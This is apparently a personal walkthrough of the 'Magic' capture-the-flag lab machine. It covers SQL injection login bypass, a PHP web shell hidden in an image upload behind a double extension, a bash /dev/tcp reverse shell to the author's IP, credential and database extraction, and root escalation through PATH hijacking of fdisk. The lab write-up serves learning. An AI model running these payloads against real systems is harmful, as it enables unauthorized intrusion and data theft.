# Magic

Magic

Sunday, 13 February 2022

1:52 pm

This is a Linux machine.

My IP is 10.10.16.9.

The target IP is 10.10.10.185.

&#x20;

&#x20;

Early port scan reveals that SSH and HTTP are open on the machine.

Detailed scan reveals the following.

!\[\[35\_Magic\_image001.png]]

&#x20;

Did a directory enumeration while visiting the website as well.

!\[\[35\_Magic\_image002.png]]

&#x20;

In the bottom left, there's this little thing.

&#x20;

!\[\[35\_Magic\_image003.png]]

Can sort of guess that we would need to do extension bypass attacks, through the use of double extensions or null byte.

&#x20;

We would need to log in somehow.

!\[\[35\_Magic\_image004.png]]

&#x20;

I'm not entirely sure about what engine or framework is being used, and I suppose that this is a custom built engine, judging by the stuff present on the screen.

Directory enumeration reveals thing that I cannot access.

!\[\[35\_Magic\_image005.png]]

&#x20;

Let's try intercepting the response and seeing what we can do with it.

&#x20;

!\[\[35\_Magic\_image006.png]]

&#x20;

Cool little response, seems that there is no protection or whatever. Looks pretty basic. Let's try SQLmap and NoSQLI.

Testing out some payloads, I was able to get one to work while SQLmap was working.' OR 1 --

This logged me in.

!\[\[35\_Magic\_image007.png]]

Now we can upload an image, but I suppose there's a bypass to this somehow.

Let's try uploading nothing first.

!\[\[35\_Magic\_image008.png]]

&#x20;

So there's these things that are allowed. Let's upload one and see where it goes.

We can see that this goes to the main page.

!\[\[35\_Magic\_image009.png]]

&#x20;

This was not there previously. Now we know how it works, let's try to upload a phpreverseshell or something.

!\[\[35\_Magic\_image0010.png]]

We can see that the firewall picked this up, so we need a different method.

&#x20;

I tried just including the web shell inside the code, and also just included a double extension and it worked!

{width="2.3541666666666665in" height="0.5729166666666666in"}

&#x20;

!\[\[35\_Magic\_image0012.png]]

&#x20;

{width="4.78125in" height="1.1770833333333333in"}

&#x20;

So from here, we just need to find out a way to inject the payload to test and see if it works.

From the directories I found, I enumerated further.

!\[\[35\_Magic\_image0014.png]]

We can see there's an uploads directory, and trying to access /images/uploads/test.php.jpg would display the picture!

!\[\[35\_Magic\_image0015.png]]

Trying to append a command into it, we can see that it works!

!\[\[35\_Magic\_image0016.png]]

&#x20;

Sick, now we just need a reverse shell.

&#x20;

Tried this one and it worked out well.

!\[\[35\_Magic\_image0017.png]]

&#x20;

Just a URL encoding of bash -c 'bash -I >& /dev/tcp/10.10.16.9/1234 0>&1.

&#x20;

!\[\[35\_Magic\_image0018.png]]

Within the code, there seems to be a password inside db.php5.

&#x20;

!\[\[35\_Magic\_image0019.png]]

Intriguing.

&#x20;

There's a user called theseus as well.

&#x20;

!\[\[35\_Magic\_image0020.png]]

Let's try an SSH. Does not work :C.

&#x20;

When checking this out, we can see that this is indeed a MySQL database. I was wondering if it was possible to dump the database, and googled about mysqldump, which is made to do that. Popped in the commands, and got out the database.

&#x20;

!\[\[35\_Magic\_image0021.png]]

&#x20;

!\[\[35\_Magic\_image0022.png]]

Found a username and password.

Tried to Su into theseus using this password, and worked.

&#x20;

&#x20;

!\[\[35\_Magic\_image0023.png]]

Ran LinEnum.sh, and found this file users can execute.

&#x20;

!\[\[35\_Magic\_image0024.png]]

I was not sure what this meant at the time, so I wondered about what I can do with it, as it seems to just print out well, system information.

&#x20;

There are a few lines that are interesting.

!\[\[35\_Magic\_image0025.png]]

&#x20;

Why is permission being denied here? Well, I don't know. I got a hint from a walkthrough and saw that there's an fdisk thing being denied access, and I wonder what that is and why it is being denied.

&#x20;

From here, I did some research on fdisk, which is actually a CLI that provides disk-partitioning functions. So right now, the machine cannot open fdisk, and I need to make an fdisk to allow for it to open and execute whatever is inside of it.

&#x20;

So basically, this executes the code as root, and I need to create something that relates to that. As such, I created one indeed.

Using this command, I quickly created one reverse shell into an fdisk executable.

!\[\[35\_Magic\_image0026.png]]

&#x20;

Got a listener port and but it did not work upon execution of sysinfo, because I realised that the fdisk was not being read at all. I need to change the PATH in order to allow for sysinfo to read my fdisk directly. Otherwise, it would keep not finding it. This is because of the fact that we are able to execute it, we need to change our env PATH to allow for the code to find the correct file and execute my reverse shell.

&#x20;

Googled how to change the path, and appended it to the paths available.

&#x20;

!\[\[35\_Magic\_image0027.png]]

Changed the port to 443, as the connection was not sustained, probably a firewall I did not check.

&#x20;

Ran sysinfo and gained a root shell on the listener port.

!\[\[35\_Magic\_image0028.png]]

I referred to the solutions for a hint about what to do with fdisk, where I learnt quite a bit about this environment PATH and how to filter through the output of LinEnum.sh.

&#x20;

Preferably, I would not use that script, as I should find this sort of thing myself. Downloading a script into a target machine is not good as anti-viruses or firewalls may pick up on it.
